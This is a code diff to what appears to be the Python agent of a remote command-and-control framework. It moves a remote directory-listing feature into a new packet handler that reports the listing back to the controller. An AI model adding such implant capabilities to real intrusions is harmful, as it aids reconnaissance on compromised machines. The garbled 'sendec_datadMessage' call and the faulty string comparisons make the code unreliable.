@@ -349,6 +349,31 @@ def process_packet(packetType, data, resultID):
         except Exception as e:
             sendec_datadMessage(build_response_packet(0, "[!] Error in writing file %s during upload: %s" %(filePath, str(e)), resultID))
 
+    elif packetType == 43:
+        # dir list
+        parts = data.split(" ")
+        cmdargs = parts[0]
+
+        path = '/'  # default to root
+        if cmdargs is not None and cmdargs is not '':  # strip trailing slash for uniformity
+            path = cmdargs.rstrip('/')
+        if path[0] is not '/':  # always scan relative to root for uniformity
+            path = '/{0}'.format(path)
+        if not os.path.isdir(path):
+            return 'Directory {} not found.'.format(path)
+        items = []
+        with os.scandir(path) as it:
+            for entry in it:
+                items.append({'path': entry.path, 'name': entry.name, 'is_file': entry.is_file()})
+
+        result_data = json.dumps({
+            'directory_name': path if len(path) == 1 else path.split('/')[-1],
+            'directory_path': path,
+            'items': items
+        })
+
+        send_message(build_response_packet(43, result_data, resultID))
+
     elif packetType == 50:
         # return the currently running jobs
         msg = ""
@@ -941,24 +966,6 @@ def directory_listing(path):
 
 # additional implementation methods
 def run_command(command, cmdargs=None):
-    if re.compile("(vrls)").match(command):
-        path = '/'  # default to root
-        if cmdargs is not None:  # strip trailing slash for uniformity
-            path = cmdargs.rstrip('/')
-        if path[0] is not '/':  # always scan relative to root for uniformity
-            path = '/{0}'.format(path)
-        if not os.path.isdir(path):
-            return 'Directory {} not found.'.format(path)
-        items = []
-        with os.scandir(path) as it:
-            for entry in it:
-                items.append({'path': entry.path, 'name': entry.name, 'is_file': entry.is_file()})
-
-        return '{}|{}'.format('vrls', json.dumps({
-            'directory_name': path if len(path) == 1 else path.split('/')[-1],
-            'directory_path': path,
-            'items': items
-        }))
     if re.compile("(ls|dir)").match(command):
         if cmdargs == None or not os.path.exists(cmdargs):
             cmdargs = '.'
